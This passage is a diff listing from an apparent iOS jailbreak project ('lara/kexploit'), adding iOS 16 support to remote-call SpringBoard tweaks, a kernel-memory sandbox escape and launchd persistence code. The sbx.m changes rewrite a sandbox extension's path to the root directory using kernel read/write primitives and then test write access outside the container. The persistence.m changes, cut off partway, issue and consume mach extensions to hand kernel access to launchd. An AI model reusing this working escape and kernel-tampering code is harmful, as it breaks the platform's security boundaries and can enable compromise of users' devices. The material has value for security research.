     [defaults removeObjectForKey:krootvnodekey];
     [defaults removeObjectForKey:kkernprocsize];
     [defaults synchronize];
  ```

  </details>
- 🟡 `lara/kexploit/pe/rc.m` (modified) — +162 / -29
  <details><summary>Diff</summary>

  ```diff
  @@ -26,6 +26,21 @@
 #define PT_DETACH       11
 #define PT_ATTACHEXC    14
 
+static bool rc_runtime_is_ios16(void) {
+    NSString *version = [[UIDevice currentDevice] systemVersion];
+    return [version compare:@"16.0" options:NSNumericSearch] != NSOrderedAscending &&
+           [version compare:@"17.0" options:NSNumericSearch] == NSOrderedAscending;
+}
+
+static bool rc_ios16_require(const char *context, const char *name, uint64_t value) {
+    if (value) {
+        return true;
+    }
+    printf("(rc) iOS16: %s missing %s\n", context, name);
+    fflush(stdout);
+    return false;
+}
+
 void status_bar_time_format(RemoteCall *proc, const char *dateFormat) {
     if (!proc) {
         printf("(rc) RemoteCall not initialized\n");
@@ -157,13 +172,59 @@ static int hide_labels_in_view(RemoteCall *proc, uint64_t parentView) {
     return hidden;
 }
 
+static int hide_icon_labels_swizzle(RemoteCall *proc, bool swizzleSetter) {
+    uint64_t clsNSObject = remote_getClass(proc, "NSObject");
+    uint64_t clsSBIconView = remote_getClass(proc, "SBIconView");
+    int swizzled = 0;
+
+    if (clsNSObject && clsSBIconView) {
+        uint64_t selIsProxy = remote_sel(proc, "isProxy");
+        uint64_t methodReturn0 = RemoteArbCall(proc, class_getInstanceMethod, clsNSObject, selIsProxy);
+        uint64_t impReturn0 = RemoteArbCall(proc, method_getImplementation, methodReturn0);
+
+        uint64_t selAllowsGet = remote_sel(proc, "allowsLabelArea");
+        uint64_t methodAllowsGet = RemoteArbCall(proc, class_getInstanceMethod, clsSBIconView, selAllowsGet);
+        if (methodAllowsGet && impReturn0) {
+            RemoteArbCall(proc, method_setImplementation, methodAllowsGet, impReturn0);
+            swizzled++;
+            printf("(rc) Swizzled allowsLabelArea to return NO\n");
+        }
+
+        if (swizzleSetter) {
+            uint64_t selSelf = remote_sel(proc, "self");
+            uint64_t methodNoOp = RemoteArbCall(proc, class_getInstanceMethod, clsNSObject, selSelf);
+            uint64_t impNoOp = RemoteArbCall(proc, method_getImplementation, methodNoOp);
+
+            uint64_t selSetAllows = remote_sel(proc, "setAllowsLabelArea:");
+            uint64_t methodSetAllows = RemoteArbCall(proc, class_getInstanceMethod, clsSBIconView, selSetAllows);
+            if (methodSetAllows && impNoOp) {
+                RemoteArbCall(proc, method_setImplementation, methodSetAllows, impNoOp);
+                swizzled++;
+                printf("(rc) Swizzled setAllowsLabelArea: to no-op\n");
+            }
+        } else {
+            printf("(rc) Skipped setAllowsLabelArea: swizzle\n");
+        }
+    } else {
+        printf("(rc) Failed to find SBIconView or NSObject for swizzling\n");
+    }
+
+    return swizzled;
+}
+
 int hide_icon_labels(RemoteCall *proc) {
     if (!proc) {
         printf("(rc) RemoteCall not initialized\n");
         return -1;
     }
     printf("(rc) Hiding icon labels natively...\n");
 
+    if (rc_runtime_is_ios16()) {
+        printf("(rc) iOS16: skip icon view walk; using SBIconView getter swizzle only\n");
+        int swizzled = hide_icon_labels_swizzle(proc, false);
+        return swizzled ? swizzled : -1;
+    }
+
     uint64_t selShared   = remote_sel(proc, "sharedInstance");
     uint64_t selIconMgr  = remote_sel(proc, "iconManager");
     uint64_t selCount    = remote_sel(proc, "count");
@@ -192,36 +253,9 @@ int hide_icon_labels(RemoteCall *proc) {
     
     printf("(rc) Initial hidden labels: %d\n", totalHidden);
 
-    uint64_t clsNSObject = remote_getClass(proc, "NSObject");
-    uint64_t clsSBIconView = remote_getClass(proc, "SBIconView");
-    
-    if (clsNSObject && clsSBIconView) {
-        uint64_t selIsProxy = remote_sel(proc, "isProxy");
-        uint64_t methodReturn0 = RemoteArbCall(proc, class_getInstanceMethod, clsNSObject, selIsProxy);
-        uint64_t impReturn0 = RemoteArbCall(proc, method_getImplementation, methodReturn0);
-
-        uint64_t selSelf = remote_sel(proc, "self");
-        uint64_t methodNoOp = RemoteArbCall(proc, class_getInstanceMethod, clsNSObject, selSelf);
-        uint64_t impNoOp = RemoteArbCall(proc, method_getImplementation, methodNoOp);
+    int swizzled = hide_icon_labels_swizzle(proc, true);
 
-        uint64_t selAllowsGet = remote_sel(proc, "allowsLabelArea");
-        uint64_t methodAllowsGet = RemoteArbCall(proc, class_getInstanceMethod, clsSBIconView, selAllowsGet);
-        if (methodAllowsGet && impReturn0) {
-            RemoteArbCall(proc, method_setImplementation, methodAllowsGet, impReturn0);
-            printf("(rc) Swizzled allowsLabelArea to return NO\n");
-        }
-
-        uint64_t selSetAllows = remote_sel(proc, "setAllowsLabelArea:");
-        uint64_t methodSetAllows = RemoteArbCall(proc, class_getInstanceMethod, clsSBIconView, selSetAllows);
-        if (methodSetAllows && impNoOp) {
-            RemoteArbCall(proc, method_setImplementation, methodSetAllows, impNoOp);
-            printf("(rc) Swizzled setAllowsLabelArea: to no-op\n");
-        }
-    } else {
-        printf("(rc) Failed to find SBIconView or NSObject for swizzling\n");
-    }
-
-    return totalHidden;
+    return totalHidden ? totalHidden : swizzled;
 }
 
 int set_dock_icon_count(RemoteCall *proc, int count) {
@@ -304,6 +338,8 @@ int five_icon_dock(RemoteCall *proc) {
 }
 
 int enable_upside_down(RemoteCall *proc) {
+    bool isIOS16 = rc_runtime_is_ios16();
+
     uint64_t clsSBAlertItemRootViewController = remote_getClass(proc, "SBAlertItemRootViewController");
     uint64_t clsSBHomeScreenViewController = remote_getClass(proc, "SBHomeScreenViewController");
     uint64_t clsSBCoverSheetPrimarySlidingViewController = remote_getClass(proc, "SBCoverSheetPrimarySlidingViewController");
@@ -325,22 +361,47 @@ int enable_upside_down(RemoteCall *proc) {
     uint64_t methodReturn1 = RemoteArbCall(proc, class_getInstanceMethod, clsSBCoverSheetPrimarySlidingViewController, selReturn1);
     uint64_t methodReturn6 = RemoteArbCall(proc, class_getInstanceMethod, clsSBShelfExpansionSwitcherModifier, selReturn6);
     uint64_t methodReturn0x1E = RemoteArbCall(proc, class_getInstanceMethod, clsSBAlertItemRootViewController, selOrientations);
+
+    if (isIOS16) {
+        if (!methodAllowed || !methodHomeScreen || !methodLockScreen ||
+            !methodOrientationMode || !methodSupportedOrientations ||
+            !methodReturn1 || !methodReturn6 || !methodReturn0x1E) {
+            printf("(rc) iOS16: enable_upside_down missing method; aborting before method_setImplementation\n");
+            fflush(stdout);
+            return -1;
+        }
+    }
     
     // swizzle these to a return 6 gadget aka UIInterfaceOrientationMaskPortrait | UIInterfaceOrientationMaskPortraitUpsideDown
     // -[SBShelfExpansionSwitcherModifier transactionCompletionOptions]:
     //    mov    w0, #0x6
     //    ret
     uint64_t return6Imp = RemoteArbCall(proc, method_getImplementation, methodReturn6);
+    if (isIOS16 && !return6Imp) {
+        printf("(rc) iOS16: enable_upside_down missing return6 IMP\n");
+        fflush(stdout);
+        return -1;
+    }
     RemoteArbCall(proc, method_setImplementation, methodHomeScreen, (uint64_t)return6Imp);
     RemoteArbCall(proc, method_setImplementation, methodLockScreen, (uint64_t)return6Imp);
     
     // swizzle these to a return 1 gadget
     uint64_t return1Imp = RemoteArbCall(proc, method_getImplementation, methodReturn1);
+    if (isIOS16 && !return1Imp) {
+        printf("(rc) iOS16: enable_upside_down missing return1 IMP\n");
+        fflush(stdout);
+        return -1;
+    }
     RemoteArbCall(proc, method_setImplementation, methodAllowed, (uint64_t)return1Imp);
     
     // forward _orientationMode to 0x1e //_supportedOrientations
     //uint64_t supportedImp = RemoteArbCall(proc, method_getImplementation, methodSupportedOrientations);
     uint64_t return0x1EImp = RemoteArbCall(proc, method_getImplementation, methodReturn0x1E);
+    if (isIOS16 && !return0x1EImp) {
+        printf("(rc) iOS16: enable_upside_down missing return0x1E IMP\n");
+        fflush(stdout);
+        return -1;
+    }
     RemoteArbCall(proc, method_setImplementation, methodOrientationMode, (uint64_t)return0x1EImp);
     RemoteArbCall(proc, method_setImplementation, methodSupportedOrientations, (uint64_t)return0x1EImp);
     
@@ -367,6 +428,11 @@ int enable_upside_down(RemoteCall *proc) {
 
 // FIXME: floating dock does not hide at all
 int enable_floating_dock(RemoteCall *proc) {
+    if (!proc) {
+        printf("(rc) RemoteCall not initialized\n");
+        return -1;
+    }
+    bool isIOS16 = rc_runtime_is_ios16();
     uint64_t clsReturn1 = remote_getClass(proc, "SBCoverSheetPrimarySlidingViewController");
     uint64_t clsSBFloatingDockController = remote_getClass(proc, "SBFloatingDockController");
     uint64_t clsSBIconController = remote_getClass(proc, "SBIconController");
@@ -385,14 +451,33 @@ int enable_floating_dock(RemoteCall *proc) {
     uint64_t methodSupported = RemoteArbCall(proc, class_getClassMethod, clsSBFloatingDockController, selSupported);
     uint64_t methodSupported2 = RemoteArbCall(proc, class_getClassMethod, clsSBFloatingDockController, selSupported2);
     uint64_t methodReturn1 = RemoteArbCall(proc, class_getInstanceMethod, clsReturn1, selReturn1);
+
+    if (isIOS16 &&
+        (!rc_ios16_require("floating dock", "SBFloatingDockController", clsSBFloatingDockController) ||
+         !rc_ios16_require("floating dock", "SBIconController", clsSBIconController) ||
+         !rc_ios16_require("floating dock", "SBMainWorkspace", clsSBMainWorkspace) ||
+         !rc_ios16_require("floating dock", "isFloatingDockSupported method", methodSupported) ||
+         !rc_ios16_require("floating dock", "isFloatingDockUtilitiesSupported method", methodSupported2) ||
+         !rc_ios16_require("floating dock", "_canShowWhileLocked method", methodReturn1))) {
+        return -1;
+    }
     
     uint64_t return1Imp = RemoteArbCall(proc, method_getImplementation, methodReturn1);
+    if (isIOS16 && !rc_ios16_require("floating dock", "return1 IMP", return1Imp)) {
+        return -1;
+    }
     RemoteArbCall(proc, method_setImplementation, methodSupported, (uint64_t)return1Imp);
     RemoteArbCall(proc, method_setImplementation, methodSupported2, (uint64_t)return1Imp);
     
     uint64_t workspace = remote_msg(proc, clsSBMainWorkspace, selSharedInstance, 0,0,0,0);
     uint64_t mainWindowScene = remote_msg(proc, workspace, selMainWindowScene, 0,0,0,0);
     uint64_t iconController = remote_msg(proc, clsSBIconController, selSharedInstance, 0,0,0,0);
+    if (isIOS16 &&
+        (!rc_ios16_require("floating dock", "SBMainWorkspace sharedInstance", workspace) ||
+         !rc_ios16_require("floating dock", "mainWindowScene", mainWindowScene) ||
+         !rc_ios16_require("floating dock", "SBIconController sharedInstance", iconController))) {
+        return -1;
+    }
     return ![proc doRemoteCallSyncOnMainThread:^{
         uint64_t dockController;
         if (remote_msg(proc, iconController, selRespondsTo, createFloatingDock, 0,0,0)) {
@@ -424,6 +509,11 @@ int enable_floating_dock(RemoteCall *proc) {
 }
 
 int enable_grid_app_switcher(RemoteCall *proc) {
+    if (!proc) {
+        printf("(rc) RemoteCall not initialized\n");
+        return -1;
+    }
+    bool isIOS16 = rc_runtime_is_ios16();
     uint64_t clsReturn2 = remote_getClass(proc, "SBDeckSwitcherModifier");
     uint64_t clsSBAppSwitcherSettings = remote_getClass(proc, "SBAppSwitcherSettings");
     
@@ -432,8 +522,19 @@ int enable_grid_app_switcher(RemoteCall *proc) {
     
     uint64_t methodSupported = RemoteArbCall(proc, class_getInstanceMethod, clsSBAppSwitcherSettings, selStyle);
     uint64_t methodReturn2 = RemoteArbCall(proc, class_getInstanceMethod, clsReturn2, selReturn2);
+
+    if (isIOS16 &&
+        (!rc_ios16_require("grid app switcher", "SBAppSwitcherSettings", clsSBAppSwitcherSettings) ||
+         !rc_ios16_require("grid app switcher", "SBDeckSwitcherModifier", clsReturn2) ||
+         !rc_ios16_require("grid app switcher", "switcherStyle method", methodSupported) ||
+         !rc_ios16_require("grid app switcher", "dockUpdateMode method", methodReturn2))) {
+        return -1;
+    }
     
     uint64_t return2Imp = RemoteArbCall(proc, method_getImplementation, methodReturn2);
+    if (isIOS16 && !rc_ios16_require("grid app switcher", "return2 IMP", return2Imp)) {
+        return -1;
+    }
     RemoteArbCall(proc, method_setImplementation, methodSupported, (uint64_t)return2Imp);
     
     // <SBSwitcherController: 0x670b5b300>
@@ -443,6 +544,11 @@ int enable_grid_app_switcher(RemoteCall *proc) {
 }
 
 int enable_debug_overlay(RemoteCall *proc) {
+    if (!proc) {
+        printf("(rc) RemoteCall not initialized\n");
+        return -1;
+    }
+    bool isIOS16 = rc_runtime_is_ios16();
     uint64_t clsSBMainWorkspace = remote_getClass(proc, "SBMainWorkspace");
     uint64_t clsDebugOverlayWindow = remote_getClass(proc, "UIDebuggingInformationOverlay");
     uint64_t clsDebugOverlayHandler = remote_getClass(proc, "UIDebuggingInformationOverlayInvokeGestureHandler");
@@ -467,14 +573,34 @@ int enable_debug_overlay(RemoteCall *proc) {
     // Swizzle -[UIDebuggingInformationOverlay init] to -[UIWindow init] to bypass internal check
     uint64_t methodWindowInit = RemoteArbCall(proc, class_getInstanceMethod, clsUIWindow, selInit);
     uint64_t methodOverlayInit = RemoteArbCall(proc, class_getInstanceMethod, clsDebugOverlayWindow, selInit);
+    if (isIOS16 &&
+        (!rc_ios16_require("debug overlay", "SBMainWorkspace", clsSBMainWorkspace) ||
+         !rc_ios16_require("debug overlay", "UIDebuggingInformationOverlay", clsDebugOverlayWindow) ||
+         !rc_ios16_require("debug overlay", "UIDebuggingInformationOverlayInvokeGestureHandler", clsDebugOverlayHandler) ||
+         !rc_ios16_require("debug overlay", "UIApplication", clsUIApplication) ||
+         !rc_ios16_require("debug overlay", "UITapGestureRecognizer", clsUITapGestureRecognizer) ||
+         !rc_ios16_require("debug overlay", "UIWindow", clsUIWindow) ||
+         !rc_ios16_require("debug overlay", "UIWindow init method", methodWindowInit) ||
+         !rc_ios16_require("debug overlay", "overlay init method", methodOverlayInit))) {
+        return -1;
+    }
     uint64_t impWindowInit = RemoteArbCall(proc, method_getImplementation, methodWindowInit);
+    if (isIOS16 && !rc_ios16_require("debug overlay", "UIWindow init IMP", impWindowInit)) {
+        return -1;
+    }
     RemoteArbCall(proc, method_setImplementation, methodOverlayInit, impWindowInit);
     
     // Set windowScene
     uint64_t workspace = remote_msg(proc, clsSBMainWorkspace, selSharedInstance, 0,0,0,0);
     uint64_t mainWindowScene = remote_msg(proc, workspace, selMainWindowScene, 0,0,0,0);
     remote_msg(proc, clsDebugOverlayWindow, selPerform, selOverlay, 0, 1,0); // init window
     uint64_t debugOverlay = remote_msg(proc, clsDebugOverlayWindow, selOverlay, 0,0,0,0);
+    if (isIOS16 &&
+        (!rc_ios16_require("debug overlay", "SBMainWorkspace sharedInstance", workspace) ||
+         !rc_ios16_require("debug overlay", "mainWindowScene", mainWindowScene) ||
+         !rc_ios16_require("debug overlay", "overlay", debugOverlay))) {
+        return -1;
+    }
     remote_msg(proc, debugOverlay, selPerform, selSetWindowScene, mainWindowScene, 1,0);
     
     // register gesture recognizer to the status bar
@@ -484,6 +610,13 @@ int enable_debug_overlay(RemoteCall *proc) {
     remote_msg(proc, doubleTapGesture, selSetNumberOfTapsRequired, 2, 0,0,0);
     uint64_t app = remote_msg(proc, clsUIApplication, selSharedApplication, 0,0,0,0);
     uint64_t statusBar = remote_msg(proc, app, selStatusBar, 0,0,0,0);
+    if (isIOS16 &&
+        (!rc_ios16_require("debug overlay", "main handler", target) ||
+         !rc_ios16_require("debug overlay", "tap gesture", doubleTapGesture) ||
+         !rc_ios16_require("debug overlay", "sharedApplication", app) ||
+         !rc_ios16_require("debug overlay", "statusBarForEmbeddedDisplay", statusBar))) {
+        return -1;
+    }
     remote_msg(proc, statusBar, selPerform, selAddGestureRecognizer, doubleTapGesture, 1,0);
     RemoteArbCall(proc, objc_release, doubleTapGesture);
     
  ```

  </details>
- 🟡 `lara/kexploit/pe/sbx.m` (modified) — +313 / -0
  <details><summary>Diff</summary>

  ```diff
  @@ -14,6 +14,8 @@
 #include <stdarg.h>
 #include <limits.h>
 #include <stdlib.h>
+#include <dirent.h>
+#include <sys/stat.h>
 #include <sys/sysctl.h>
 #include <mach/machine.h>
 
@@ -23,6 +25,8 @@
 
 #define MAC_SYS_SANDBOX_EXTENSION_ISSUE 461
 
+extern int64_t sandbox_extension_consume(const char *extension_token);
+
 typedef void (*sbx_log_callback_t)(const char *message);
 static sbx_log_callback_t g_sbx_log = NULL;
 
@@ -205,7 +209,14 @@ uint64_t sbx_ucredbyproc(uint64_t proc) {
     return ucred;
 }
 
+static bool ios16_system(void);
+static int ios16_sbx_escape(uint64_t self_proc);
+
 int sbx_escape(uint64_t self_proc) {
+    if (ios16_system()) {
+        return ios16_sbx_escape(self_proc);
+    }
+
     if (!self_proc) {
         sbx_log("ds_get_our_proc() returned 0x0 — trying ourproc() fallback...");
         self_proc = ourproc();
@@ -513,3 +524,305 @@ void sbx_freestr(char *s) {
 
     return copy;
 }
+
+#pragma mark - iOS 16
+
+#define IOS16_OFF_SANDBOX_EXT_TABLE 0x08
+#define IOS16_OFF_EXT_META          0x50
+#define IOS16_BUCKET_COUNT          18
+#define IOS16_TARGET_PATH           "/"
+#define K_ios16(x) ds_isvalid((uint64_t)(x))
+
+static bool ios16_system(void) {
+    NSOperatingSystemVersion version = [[NSProcessInfo processInfo] operatingSystemVersion];
+    return version.majorVersion == 16;
+}
+
+static bool ios16_write64_in_block(uint64_t addr, uint64_t value) {
+    uint64_t base = addr & ~(uint64_t)(KRW_LEN - 1);
+    uint64_t off = addr - base;
+    if (off + sizeof(uint64_t) > KRW_LEN) {
+        return false;
+    }
+
+    uint8_t buf[KRW_LEN];
+    ds_kread(base, buf, KRW_LEN);
+    *(uint64_t *)(buf + off) = value;
+    ds_kwritezoneelement(base, buf, KRW_LEN);
+    return true;
+}
+
+static bool ios16_class_name_is(uint64_t class_ptr, const char *expected) {
+    if (!K_ios16(class_ptr) || !expected) return false;
+
+    size_t len = strlen(expected);
+    if (len > 32) len = 32;
+
+    char got[33] = {0};
+    for (size_t off = 0; off < len; off += 8) {
+        uint64_t q = ds_kread64(class_ptr + off);
+        size_t n = len - off;
+        if (n > 8) n = 8;
+        memcpy(got + off, &q, n);
+    }
+    return memcmp(got, expected, len) == 0;
+}
+
+static bool ios16_class_name_known(uint64_t class_ptr) {
+    return ios16_class_name_is(class_ptr, "com.apple.sandbox.container") ||
+           ios16_class_name_is(class_ptr, "com.apple.sandbox.executable") ||
+           ios16_class_name_is(class_ptr, "com.apple.app-sandbox.read") ||
+           ios16_class_name_is(class_ptr, "com.apple.app-sandbox.read-write") ||
+           ios16_class_name_is(class_ptr, "com.apple.app-sandbox.write");
+}
+
+static bool ios16_ext_table_looks_valid(uint64_t table) {
+    if (!K_ios16(table)) return false;
+
+    for (int bucket = 0; bucket < IOS16_BUCKET_COUNT; bucket++) {
+        uint64_t node = S(ds_kread64(table + (uint64_t)bucket * 8));
+        for (int depth = 0; depth < 8 && K_ios16(node); depth++) {
+            uint64_t next_node = S(ds_kread64(node + 0x00));
+            uint64_t ext = S(ds_kread64(node + 0x08));
+            uint64_t class_ptr = S(ds_kread64(node + 0x10));
+            if (ios16_class_name_known(class_ptr) && K_ios16(ext)) {
+                uint64_t path = S(ds_kread64(ext + OFF_EXT_DATA));
+                uint64_t len = ds_kread64(ext + OFF_EXT_DATALEN);
+                if (K_ios16(path) && len > 0 && len < PATH_MAX) {
+                    return true;
+                }
+            }
+            if (!next_node || next_node == node) break;
+            node = next_node;
+        }
+    }
+
+    return false;
+}
+
+static uint64_t ios16_extension_table(uint64_t sandbox) {
+    uint64_t table = S(ds_kread64(sandbox + IOS16_OFF_SANDBOX_EXT_TABLE));
+    if (ios16_ext_table_looks_valid(table)) {
+        return table;
+    }
+
+    table = S(ds_kread64(sandbox + OFF_SANDBOX_EXT_SET));
+    if (ios16_ext_table_looks_valid(table)) {
+        return table;
+    }
+
+    return 0;
+}
+
+static char *ios16_issue_token(const char *extension_class, const char *path) {
+    if (!extension_class || !path) return NULL;
+
+    void *h = dlopen("libsandbox.dylib", RTLD_NOW);
+    if (!h) h = dlopen("/usr/lib/libsandbox.dylib", RTLD_NOW);
+    if (!h) return NULL;
+
+    typedef char *(*issue_to_self_t)(const char *, const char *, int);
+    typedef char *(*issue_file_t)(const char *, const char *, int);
+    typedef void (*free_token_t)(char *);
+
+    issue_to_self_t issue_to_self = (issue_to_self_t)dlsym(h, "sandbox_extension_issue_file_to_self");
+    issue_file_t issue_file = (issue_file_t)dlsym(h, "sandbox_extension_issue_file");
+
+    char *token = NULL;
+    if (issue_to_self) {
+        token = issue_to_self(extension_class, path, 0);
+    }
+    if (!token && issue_file) {
+        token = issue_file(extension_class, path, 0);
+    }
+    if (!token) return NULL;
+
+    char *copy = strdup(token);
+    free_token_t free_token = (free_token_t)dlsym(h, "sandbox_extension_free");
+    if (free_token) {
+        free_token(token);
+    } else {
+        free(token);
+    }
+    return copy;
+}
+
+static int64_t ios16_seed_path(NSString *path) {
+    if (path.length == 0) return -1;
+
+    const char *classes[] = {
+        "com.apple.app-sandbox.read-write",
+        "com.apple.app-sandbox.read",
+        "com.apple.app-sandbox.write",
+    };
+
+    const char *cpath = path.fileSystemRepresentation;
+    for (size_t i = 0; i < sizeof(classes) / sizeof(classes[0]); i++) {
+        char *token = ios16_issue_token(classes[i], cpath);
+        if (!token) continue;
+
+        int64_t handle = sandbox_extension_consume(token);
+        free(token);
+        return handle;
+    }
+
+    return -1;
+}
+
+static int64_t ios16_seed_probe(void) {
+    @autoreleasepool {
+        NSArray<NSString *> *dirs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
+        NSString *docs = dirs.firstObject ?: NSHomeDirectory();
+        NSString *probe = [docs stringByAppendingPathComponent:@"lara-sbx-probe"];
+        if (probe.length == 0) return -1;
+
+        [[NSFileManager defaultManager] createDirectoryAtPath:probe
+                                  withIntermediateDirectories:YES
+                                                   attributes:nil
+                                                        error:nil];
+        return ios16_seed_path(probe);
+    }
+}
+
+static bool ios16_find_extension(uint64_t sandbox, const char *class_name, int64_t handle, bool any_handle, uint64_t *out_ext) {
+    if (out_ext) *out_ext = 0;
+    uint64_t table = ios16_extension_table(sandbox);
+    if (!K_ios16(table)) return false;
+
+    for (int bucket = 0; bucket < IOS16_BUCKET_COUNT; bucket++) {
+        uint64_t node = S(ds_kread64(table + (uint64_t)bucket * 8));
+        for (int node_depth = 0; node_depth < 8 && K_ios16(node); node_depth++) {
+            uint64_t next_node = S(ds_kread64(node + 0x00));
+            uint64_t ext = S(ds_kread64(node + 0x08));
+            uint64_t class_ptr = S(ds_kread64(node + 0x10));
+            if (ios16_class_name_is(class_ptr, class_name)) {
+                for (int ext_depth = 0; ext_depth < 8 && K_ios16(ext); ext_depth++) {
+                    uint64_t next_ext = S(ds_kread64(ext + 0x00));
+                    uint64_t ext_handle = ds_kread64(ext + 0x08);
+                    if (any_handle || (int64_t)ext_handle == handle) {
+                        if (out_ext) *out_ext = ext;
+                        return true;
+                    }
+                    if (!next_ext || next_ext == ext) break;
+                    ext = next_ext;
+                }
+            }
+            if (!next_node || next_node == node) break;
+            node = next_node;
+        }
+    }
+
+    return false;
+}
+
+static bool ios16_path_has_prefix(uint64_t addr, const char *prefix) {
+    if (!K_ios16(addr) || !prefix) return false;
+
+    size_t len = strlen(prefix);
+    char got[PATH_MAX] = {0};
+    if (len >= sizeof(got)) return false;
+
+    for (size_t off = 0; off < len; off += 8) {
+        uint64_t q = ds_kread64(addr + off);
+        size_t n = len - off;
+        if (n > 8) n = 8;
+        memcpy(got + off, &q, n);
+    }
+
+    return memcmp(got, prefix, len) == 0;
+}
+
+static bool ios16_set_extension_path(uint64_t ext, const char *target) {
+    uint64_t path = S(ds_kread64(ext + OFF_EXT_DATA));
+    if (!K_ios16(path) || !target) return false;
+
+    uint64_t target_len = (uint64_t)strlen(target);
+    uint64_t first = path & ~(uint64_t)(KRW_LEN - 1);
+    uint64_t end = path + target_len + 1;
+    if (!K_ios16(first)) return false;
+
+    for (uint64_t base = first; base < end; base += KRW_LEN) {
+        uint8_t block[KRW_LEN];
+        ds_kread(base, block, KRW_LEN);
+        for (uint64_t addr = base; addr < base + KRW_LEN; addr++) {
+            if (addr < path || addr >= end) continue;
+            uint64_t idx = addr - path;
+            block[addr - base] = (idx < target_len) ? (uint8_t)target[idx] : 0;
+        }
+        ds_kwritezoneelement(base, block, KRW_LEN);
+    }
+
+    bool wrote_len = ios16_write64_in_block(ext + OFF_EXT_DATALEN, target_len);
+    return wrote_len && ds_kread64(ext + OFF_EXT_DATALEN) == target_len && ios16_path_has_prefix(path, target);
+}
+
+static bool ios16_test_root_access(void) {
+    DIR *dir = opendir(IOS16_TARGET_PATH);
+    if (dir) closedir(dir);
+
+    int fd = open("/private/var/mobile/Library/Preferences/lara-sbx-access.txt", O_WRONLY | O_CREAT | O_TRUNC, 0600);
+    if (fd < 0) return false;
+
+    const char marker[] = "lara-sbx-test\n";
+    ssize_t written = write(fd, marker, sizeof(marker) - 1);
+    close(fd);
+    int unlinked = unlink("/private/var/mobile/Library/Preferences/lara-sbx-access.txt");
+    return dir != NULL && written == (ssize_t)(sizeof(marker) - 1) && unlinked == 0;
+}
+
+static int ios16_sbx_escape(uint64_t self_proc) {
+    if (!self_proc) {
+        self_proc = ourproc();
+    }
+    if (!self_proc) {
+        sbx_log("iOS16 sandbox escape failed: no self proc");
+        return -1;
+    }
+
+    uint64_t ucred = sbx_ucredbyproc(self_proc);
+    if (!ucred) return -1;
+
+    uint64_t label = S(ds_kread64(ucred + OFF_UCRED_CR_LABEL));
+    if (!K_ios16(label)) return -1;
+
+    uint64_t sandbox = S(ds_kread64(label + OFF_LABEL_SANDBOX));
+    if (!K_ios16(sandbox)) return -1;
+
+    int64_t probe_handle = ios16_seed_probe();
+    if (probe_handle < 0) {
+        sbx_log("iOS16 sandbox escape failed: no probe extension");
+        return -1;
+    }
+
+    uint64_t probe_ext = 0;
+    uint64_t container_ext = 0;
+    if (!ios16_find_extension(sandbox, "com.apple.app-sandbox.read-write", probe_handle, false, &probe_ext) || !K_ios16(probe_ext)) {
+        sbx_log("iOS16 sandbox escape failed: probe extension not found");
+        return -1;
+    }
+    if (!ios16_find_extension(sandbox, "com.apple.sandbox.container", 0, true, &container_ext) || !K_ios16(container_ext)) {
+        sbx_log("iOS16 sandbox escape failed: container extension not found");
+        return -1;
+    }
+
+    if (!ios16_write64_in_block(probe_ext + OFF_EXT_DATALEN, 1)) {
+        return -1;
+    }
+
+    uint64_t container_meta = ds_kread64(container_ext + IOS16_OFF_EXT_META);
+    if (!ios16_write64_in_block(probe_ext + IOS16_OFF_EXT_META, container_meta)) {
+        return -1;
+    }
+
+    if (!ios16_set_extension_path(probe_ext, IOS16_TARGET_PATH)) {
+        return -1;
+    }
+
+    if (!ios16_test_root_access()) {
+        sbx_log("iOS16 sandbox escape verification failed");
+        return -1;
+    }
+
+    sbx_log("iOS16 sandbox escape succeeded");
+    return 0;
+}
  ```

  </details>
- 🟡 `lara/kexploit/persistence.m` (modified) — +172 / -0
  <details><summary>Diff</summary>

  ```diff
  @@ -15,8 +15,16 @@
 #import "TaskRop/RemoteCall.h"
 
 bool recover_proc_self(uint64_t launchd_proc);
+static bool persist_is_ios16(void);
+static bool transfer_krw_to_launchd_ios16(void);
 
 bool transfer_krw_to_launchd(void) {
+    bool useIOS16Persistence = persist_is_ios16();
+
+    if (useIOS16Persistence) {
+        return transfer_krw_to_launchd_ios16();
+    }
+
     RemoteCall *proc = [[RemoteCall alloc] initWithProcess:@"launchd" useMigFilterBypass:NO];
     if (!proc) {
         printf("(persist) Failed to create RemoteCall for launchd\n");
@@ -144,3 +152,167 @@ bool recover_krw_primitives(void) {
 
     return true;
 }
+
+#pragma mark - iOS 16
+
+#define PERSIST_RC_TIMEOUT 10000
+#define PERSIST_IOS16_RESEARCH_ENABLED 1
+#define PERSIST_LOG(...) do { printf("(persist) " __VA_ARGS__); fflush(stdout); } while (0)
+
+static bool persist_is_ios16(void) {
+#if !PERSIST_IOS16_RESEARCH_ENABLED
+    return false;
+#endif
+    NSOperatingSystemVersion version = [[NSProcessInfo processInfo] operatingSystemVersion];
+    return version.majorVersion == 16;
+}
+
+static bool persist_issue_and_consume_mach_extension(RemoteCall *proc,
+                                                     uint64_t mem,
+                                                     const char *extension_class,
+                                                     const char *name) {
+    if (!proc || !extension_class || !name) {
+        return false;
+    }
+
+    PERSIST_LOG("issue mach extension begin class=%s name=%s\n", extension_class, name);
+    proc[mem].string = @(extension_class);
+    proc[mem + 0x100].string = @(name);
+
+    uint64_t tokenRemote = RemoteArbCallWithTimeout(PERSIST_RC_TIMEOUT,
+                                                    proc,
+                                                    sandbox_extension_issue_mach,
+                                                    mem,
+                                                    mem + 0x100,
+                                                    0);
+    PERSIST_LOG("remote sandbox_extension_issue_mach end token=0x%llx class=%s name=%s\n",
+                (unsigned long long)tokenRemote,
+                extension_class,
+                name);
+    if (!tokenRemote) {
+        return false;
+    }
+
+    RemoteArbCallWithTimeout(PERSIST_RC_TIMEOUT, proc, strcpy, mem + 0x200, tokenRemote, 0);
+    NSString *token = proc[mem + 0x200].string;
+    if (token.length == 0) {
+        return false;
+    }
+
+    int64_t consumed = sandbox_extension_consume(token.UTF8String);
+    PERSIST_LOG("consume mach extension class=%s name=%s result=%lld\n",
+                extension_class,
+                name,
+                (long long)consumed);
+    return consumed >= 1;
+}
+
+static NSString *persist_issue_remote_mach_lookup_token(RemoteCall *proc, uint64_t mem, const char *name) {
+    if (!proc || !name) {
+        return nil;
+    }
+
+    proc[mem].string = @(APP_MACH_LOOKUP);
+    proc[mem + 0x100].string = @(name);
+
+    uint64_t tokenRemote = RemoteArbCallWithTimeout(PERSIST_RC_TIMEOUT,
+                                                    proc,
+                                                    sandbox_extension_issue_mach,
+                                                    mem,
+                                                    mem + 0x100,
+                                                    0);
